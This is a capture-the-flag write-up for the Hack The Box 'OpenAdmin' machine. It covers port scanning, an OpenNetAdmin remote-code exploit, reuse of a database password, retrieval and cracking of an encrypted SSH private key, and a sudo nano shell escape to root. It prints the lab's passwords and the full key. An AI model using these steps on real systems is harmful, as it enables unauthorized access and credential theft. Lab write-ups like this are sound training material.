# Nmap
## nmap -T4 -A -p- -o openadmin.nmap 10.10.10.171

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 15:40 CET
Warning: 10.10.10.171 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.171
Host is up (0.056s latency).
Not shown: 46976 closed ports, 18557 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 777.92 seconds
```
# DirBuster Enum
Scanning result show ***/ona*** path 
Going on 10.10.10.171/ona we find OpenNetAdmin version 18.1.1 
- [Exploit 47772][1]
- [Exploit 47691][2]

Using exploit 2 we obtain a shell:

`./exploit_476921.sh 10.10.10.171/ona/`

`$ whoami`

`www-data`

# Find a user °L°

`ls /home`
```
jimmy
joanna
```

# Enumerating configs

```
ls -l /etc     
total 800
drwxr-xr-x 4 root root       4096 Aug  5  2019 X11
drwxr-xr-x 3 root root       4096 Aug  5  2019 acpi
-rw-r--r-- 1 root root       3028 Aug  5  2019 adduser.conf
drwxr-xr-x 2 root root       4096 Nov 21 14:12 alternatives
drwxr-xr-x 8 root root       4096 Nov 21 14:08 apache2
drwxr-xr-x 3 root root       4096 Aug  5  2019 apm
drwxr-xr-x 3 root root       4096 Aug  5  2019 apparmor
drwxr-xr-x 9 root root       4096 Nov 21 14:12 apparmor.d
drwxr-xr-x 3 root root       4096 Nov 21 13:43 apport
drwxr-xr-x 7 root root       4096 Nov 21 13:39 apt
-rw-r----- 1 root daemon      144 Feb 20  2018 at.deny
-rw-r--r-- 1 root root       2319 Apr  4  2018 bash.bashrc
-rw-r--r-- 1 root root         45 Apr  2  2018 bash_completion
drwxr-xr-x 2 root root       4096 Nov 21 13:43 bash_completion.d
-rw-r--r-- 1 root root        367 Jan 27  2016 bindresvport.blacklist
drwxr-xr-x 2 root root       4096 Apr 20  2018 binfmt.d
drwxr-xr-x 2 root root       4096 Aug  5  2019 byobu
drwxr-xr-x 3 root root       4096 Aug  5  2019 ca-certificates
-rw-r--r-- 1 root root       5898 Aug  5  2019 ca-certificates.conf
drwxr-xr-x 2 root root       4096 Aug  5  2019 calendar
drwxr-xr-x 3 root root       4096 Jan  2 13:24 cloud
drwxr-xr-x 2 root root       4096 Aug  5  2019 console-setup
drwxr-xr-x 2 root root       4096 Nov 21 14:12 cron.d
drwxr-xr-x 2 root root       4096 Nov 21 14:08 cron.daily
drwxr-xr-x 2 root root       4096 Aug  5  2019 cron.hourly
drwxr-xr-x 2 root root       4096 Aug  5  2019 cron.monthly
drwxr-xr-x 2 root root       4096 Aug  5  2019 cron.weekly
-rw-r--r-- 1 root root        722 Nov 16  2017 crontab
drwxr-xr-x 2 root root       4096 Aug  5  2019 cryptsetup-initramfs
-rw-r--r-- 1 root root         54 Aug  5  2019 crypttab
drwxr-xr-x 4 root root       4096 Aug  5  2019 dbus-1
-rw-r--r-- 1 root root       2969 Feb 28  2018 debconf.conf
-rw-r--r-- 1 root root         11 Jun 25  2017 debian_version
drwxr-xr-x 3 root root       4096 Jan  2 13:46 default
-rw-r--r-- 1 root root        604 Aug 13  2017 deluser.conf
drwxr-xr-x 2 root root       4096 Aug  5  2019 depmod.d
drwxr-xr-x 4 root root       4096 Aug  5  2019 dhcp
drwxr-xr-x 2 root root       4096 Aug  5  2019 dnsmasq.d
drwxr-xr-x 2 root root       4096 Aug  5  2019 dnsmasq.d-available
drwxr-xr-x 4 root root       4096 Nov 21 14:04 dpkg
-rw-r--r-- 1 root root         96 Aug  5  2019 environment
-rw-r--r-- 1 root root       1317 Jun 28  2018 ethertypes
drwxr-xr-x 4 root root       4096 Aug  5  2019 fonts
-rw-r--r-- 1 root root         89 Nov 21 13:41 fstab
-rw-r--r-- 1 root root        280 Jun 20  2014 fuse.conf
-rw-r--r-- 1 root root       2584 Feb  1  2018 gai.conf
drwxr-xr-x 2 root root       4096 Aug  5  2019 groff
-rw-r--r-- 1 root root        749 Jan  2 13:46 group
-rw-r--r-- 1 root root        735 Nov 22 23:08 group-
drwxr-xr-x 2 root root       4096 Nov 21 13:40 grub.d
-rw-r----- 1 root shadow      620 Jan  2 13:46 gshadow
-rw-r----- 1 root shadow      609 Nov 22 23:08 gshadow-
drwxr-xr-x 3 root root       4096 Aug  5  2019 gss
-rw-r--r-- 1 root root       4861 Feb 22  2018 hdparm.conf
-rw-r--r-- 1 root root         92 Apr  9  2018 host.conf
-rw-r--r-- 1 root root         10 Nov 21 13:41 hostname
-rw-r--r-- 1 root root        258 Jan  2 13:45 hosts
-rw-r--r-- 1 root root        411 Nov 21 13:41 hosts.allow
-rw-r--r-- 1 root root        711 Nov 21 13:41 hosts.deny
drwxr-xr-x 2 root root       4096 Nov 21 14:12 init
drwxr-xr-x 2 root root       4096 Jan  2 13:46 init.d
drwxr-xr-x 5 root root       4096 Nov 21 14:04 initramfs-tools
-rw-r--r-- 1 root root       1748 May 15  2017 inputrc
drwxr-xr-x 4 root root       4096 Aug  5  2019 iproute2
drwxr-xr-x 2 root root       4096 Aug  5  2019 iscsi
-rw-r--r-- 1 root root         26 Aug  5  2019 issue
-rw-r--r-- 1 root root         19 Aug  5  2019 issue.net
drwxr-xr-x 6 root root       4096 Nov 21 13:40 kernel
-rw-r--r-- 1 root root        144 Nov 21 13:40 kernel-img.conf
drwxrwxr-x 2 root landscape  4096 Feb  8  2019 landscape
-rw-r--r-- 1 root root      23434 Nov 21 14:12 ld.so.cache
-rw-r--r-- 1 root root         34 Jan 27  2016 ld.so.conf
drwxr-xr-x 2 root root       4096 Aug  5  2019 ld.so.conf.d
drwxr-xr-x 2 root root       4096 Nov 21 14:04 ldap
-rw-r--r-- 1 root root        267 Apr  9  2018 legal
-rw-r--r-- 1 root root        191 Feb  7  2018 libaudit.conf
drwxr-xr-x 2 root root       4096 Nov 21 13:40 libnl-3
-rw-r--r-- 1 root root       2995 Apr 16  2018 locale.alias
-rw-r--r-- 1 root root       9395 Nov 21 13:45 locale.gen
lrwxrwxrwx 1 root root         27 Nov 21 13:43 localtime -> /usr/share/zoneinfo/Etc/UTC
drwxr-xr-x 6 root root       4096 Nov 21 14:12 logcheck
-rw-r--r-- 1 root root      10550 Jan 25  2018 login.defs
-rw-r--r-- 1 root root        703 Aug 21  2017 logrotate.conf
drwxr-xr-x 2 root root       4096 Nov 21 14:12 logrotate.d
-rw-r--r-- 1 root root        105 Aug  5  2019 lsb-release
-rw-r--r-- 1 root root      14867 Oct 13  2016 ltrace.conf
drwxr-xr-x 3 root root       4096 Aug  5  2019 lvm
-r--r--r-- 1 root root         33 Nov 21 13:39 machine-id
-rw-r--r-- 1 root root        111 Feb 13  2018 magic
-rw-r--r-- 1 root root        111 Feb 13  2018 magic.mime
-rw-r--r-- 1 root root       3623 Nov 21 14:05 mailcap
-rw-r--r-- 1 root root        449 Jul 15  2016 mailcap.order
-rw-r--r-- 1 root root       5174 Aug  4  2018 manpath.config
drwxr-xr-x 2 root root       4096 Aug  5  2019 mdadm
-rw-r--r-- 1 root root      24301 Jul 15  2016 mime.types
-rw-r--r-- 1 root root        812 Mar 24  2018 mke2fs.conf
drwxr-xr-x 2 root root       4096 Nov 28 09:35 modprobe.d
-rw-r--r-- 1 root root        195 Aug  5  2019 modules
drwxr-xr-x 2 root root       4096 Nov 21 14:04 modules-load.d
lrwxrwxrwx 1 root root         19 Aug  5  2019 mtab -> ../proc/self/mounts
drwxr-xr-x 4 root root       4096 Nov 21 14:12 mysql
-rw-r--r-- 1 root root       9048 Feb 13  2018 nanorc
drwxr-xr-x 7 root root       4096 Jan  2 13:46 network
drwxr-xr-x 6 root root       4096 Aug  5  2019 networkd-dispatcher
-rw-r--r-- 1 root root         91 Apr  9  2018 networks
drwxr-xr-x 2 root root       4096 Aug  5  2019 newt
-rw-r--r-- 1 root root        513 Aug  5  2019 nsswitch.conf
drwxr-xr-x 2 root root       4096 Aug  5  2019 opt
lrwxrwxrwx 1 root root         21 Sep 27 18:24 os-release -> ../usr/lib/os-release
-rw-r--r-- 1 root root       6920 Sep 20  2018 overlayroot.conf
-rw-r--r-- 1 root root        552 Apr  4  2018 pam.conf
drwxr-xr-x 2 root root       4096 Nov 21 14:04 pam.d
-rw-r--r-- 1 root root       1660 Nov 22 18:01 passwd
-rw-r--r-- 1 root root       1657 Nov 22 18:00 passwd-
drwxr-xr-x 4 root root       4096 Aug  5  2019 perl
drwxr-xr-x 3 root root       4096 Nov 21 14:12 php
drwxr-xr-x 3 root root       4096 Aug  5  2019 pm
drwxr-xr-x 5 root root       4096 Aug  5  2019 polkit-1
drwxr-xr-x 2 root root       4096 Nov 21 13:41 pollinate
-rw-r--r-- 1 root root        350 Aug  5  2019 popularity-contest.conf
-rw-r--r-- 1 root root        581 Apr  9  2018 profile
drwxr-xr-x 2 root root       4096 Jan  2 13:24 profile.d
-rw-r--r-- 1 root root       2932 Dec 26  2016 protocols
drwxr-xr-x 2 root root       4096 Aug  5  2019 python3
drwxr-xr-x 2 root root       4096 Nov 21 13:44 python3.6
drwxr-xr-x 2 root root       4096 Jan  2 13:46 rc0.d
drwxr-xr-x 2 root root       4096 Nov 21 14:12 rc1.d
drwxr-xr-x 2 root root       4096 Nov 21 14:12 rc2.d
drwxr-xr-x 2 root root       4096 Nov 21 14:12 rc3.d
drwxr-xr-x 2 root root       4096 Nov 21 14:12 rc4.d
drwxr-xr-x 2 root root       4096 Nov 21 14:12 rc5.d
drwxr-xr-x 2 root root       4096 Jan  2 13:46 rc6.d
drwxr-xr-x 2 root root       4096 Jan  2 13:46 rcS.d
lrwxrwxrwx 1 root root         39 Aug  5  2019 resolv.conf -> ../run/systemd/resolve/stub-resolv.conf
-rwxr-xr-x 1 root root        268 Jul 21  2017 rmt
-rw-r--r-- 1 root root        887 Dec 26  2016 rpc
-rw-r--r-- 1 root root       1358 Jan 30  2018 rsyslog.conf
drwxr-xr-x 2 root root       4096 Jan  2 13:24 rsyslog.d
-rw-r--r-- 1 root root       3663 Jun  9  2015 screenrc
-rw-r--r-- 1 root root       4141 Jan 25  2018 securetty
drwxr-xr-x 4 root root       4096 Aug  5  2019 security
drwxr-xr-x 2 root root       4096 Aug  5  2019 selinux
-rw-r--r-- 1 root root      19183 Dec 26  2016 services
-rw-r----- 1 root shadow     1177 Nov 22 18:01 shadow
-rw-r----- 1 root shadow     1052 Nov 22 17:54 shadow-
-rw-r--r-- 1 root root        103 Aug  5  2019 shells
drwxr-xr-x 2 root root       4096 Aug  5  2019 skel
-rw-r--r-- 1 root root        100 Jun 25  2018 sos.conf
drwxr-xr-x 2 root root       4096 Nov 23 17:19 ssh
drwxr-xr-x 4 root root       4096 Nov 21 13:43 ssl
-rw-r--r-- 1 root root         74 Nov 22 18:00 subgid
-rw-r--r-- 1 root root         54 Nov 21 13:45 subgid-
-rw-r--r-- 1 root root         74 Nov 22 18:00 subuid
-rw-r--r-- 1 root root         54 Nov 21 13:45 subuid-
-r--r----- 1 root root        755 Nov 22 23:49 sudoers
drwxr-xr-x 2 root root       4096 Nov 22 23:50 sudoers.d
-rw-r--r-- 1 root root       2683 Jan 17  2018 sysctl.conf
drwxr-xr-x 2 root root       4096 Nov 21 14:04 sysctl.d
drwxr-xr-x 5 root root       4096 Nov 21 14:04 systemd
drwxr-xr-x 2 root root       4096 Aug  5  2019 terminfo
drwxr-xr-x 2 root root       4096 Nov 21 13:40 thermald
-rw-r--r-- 1 root root          8 Nov 21 13:43 timezone
drwxr-xr-x 2 root root       4096 Aug  5  2019 tmpfiles.d
-rw-r--r-- 1 root root       1260 Feb 26  2018 ucf.conf
drwxr-xr-x 4 root root       4096 Nov 21 14:04 udev
drwxr-xr-x 3 root root       4096 Aug  5  2019 ufw
drwxr-xr-x 3 root root       4096 Nov 21 14:04 update-manager
drwxr-xr-x 2 root root       4096 Nov 21 14:04 update-motd.d
drwxr-xr-x 2 root root       4096 May 24  2019 update-notifier
-rw-r--r-- 1 root root        403 Mar  1  2018 updatedb.conf
drwxr-xr-x 2 root root       4096 Aug  5  2019 vim
drwxr-xr-x 4 root root       4096 Aug  5  2019 vmware-tools
lrwxrwxrwx 1 root root         23 Aug  5  2019 vtrgb -> /etc/alternatives/vtrgb
-rw-r--r-- 1 root root       4942 Apr  8  2019 wgetrc
drwxr-xr-x 4 root root       4096 Aug  5  2019 xdg
-rw-r--r-- 1 root root        477 Mar 16  2018 zsh_command_not_found
```

```
ls /opt
ona
priv
```
```
cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

try login via ssh with ***n1nj4W4rri0R!*** and an account find before

# Jimmy Shell

ssh with jimmy:n1nj4W4rri0R! grant access but no flag here :(

enumerating some folder

```
cd /var/www/internal
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
jimmy@openadmin:/var/www/internal$ cat index.php 
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```
```
cat main.php 
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

let's try sending a post request via curl. seems not reachable from the outside

```
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6      70      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -      
```

3306 is mysql 

52846 maybe is the server but listen only on 127.0.0.1 send the curl request from the jimmy's shell

```
curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
``` 
BINGO!

# John the ripper time

let's crack the ssh key in order to find the password

`/usr/share/john/ssh2john.py joanna_idrsa > joanna_idrsa.john`
`zcat /usr/share/wordlists/rockyou.txt.gz | john -stdin joanna_idrsa.john`

***bloodninjas***

# Joanna shell

ssh -i joanna_idrsa joanna@10.10.10.171

```
sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Looking at [GTFOBin][3] we can excalate a root shell with 
```
nano
^R^X
reset; sh 1>&0 2>&0
```

![htbbadge](https://www.hackthebox.eu/badge/image/272787)

[//]: #Links
[1]: https://www.exploit-db.com/exploits/47772
[2]: https://www.exploit-db.com/exploits/47691
[3]: https://gtfobins.github.io/gtfobins/nano/#sudo
